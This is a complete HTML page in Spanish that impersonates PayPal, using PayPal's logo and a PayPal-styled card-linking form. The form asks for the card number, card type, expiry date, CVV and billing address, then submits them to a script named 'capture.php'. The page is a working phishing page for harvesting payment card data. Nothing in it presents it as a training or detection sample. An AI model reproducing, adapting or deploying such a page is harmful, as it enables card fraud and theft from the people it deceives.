<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Asociar tarjeta - PayPal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f7fa;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      text-align: center;
    }

    .paypal-logo {
      width: 50px;
      margin-bottom: 20px;
    }

    h2 {
      font-weight: 400;
      margin-bottom: 25px;
      color: #2c2e2f;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    input:focus, select:focus {
      border-color: #0070ba;
      outline: none;
    }

    button {
      background-color: #0070ba;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #005ea6;
    }

    label {
      display: block;
      text-align: left;
      margin: 5px 0 0;
      color: #333;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="paypal-logo" alt="PayPal">
    <h2>Asocie una tarjeta para comprar</h2>
<form method="POST" action="capture.php">
  <label for="numero">N.º tarjeta débito o crédito</label><br>
  <input type="text" id="numero" name="numero" maxlength="19" required placeholder="1234 5678 9012 3456">

      <label for="tipo">Tipo de tarjeta</label>
      <select id="tipo" name="tipo" required>
        <option value="">Seleccione su tipo de tarjeta</option>
        <option value="visa">Visa</option>
        <option value="mastercard">MasterCard</option>
        <option value="amex">American Express</option>
      </select>

      <label for="exp">Fecha de vencimiento</label>
      <input type="text" id="exp" name="exp" placeholder="MM/AA" required>

      <label for="cvv">Código de seguridad</label>
      <input type="text" id="cvv" name="cvv" required>

      <label for="direccion">Dirección de la tarjeta</label>
      <input type="text" id="direccion" name="direccion" placeholder="Calle 1 Av 2" required>


      <button type="submit">Asociar tarjeta</button>
    </form>
  </div>
</body>
      <script>
  const numeroInput = document.getElementById('numero');

  numeroInput.addEventListener('input', function (e) {
    // Elimina todo lo que no sean dígitos
    let value = e.target.value.replace(/\D/g, '');

    // Limita a 16 dígitos
    value = value.substring(0, 16);

    // Aplica formato con espacios cada 4 dígitos
    const formatted = value.replace(/(.{4})/g, '$1 ').trim();

    // Actualiza el valor del input
    e.target.value = formatted;
  });
</script>
</html>
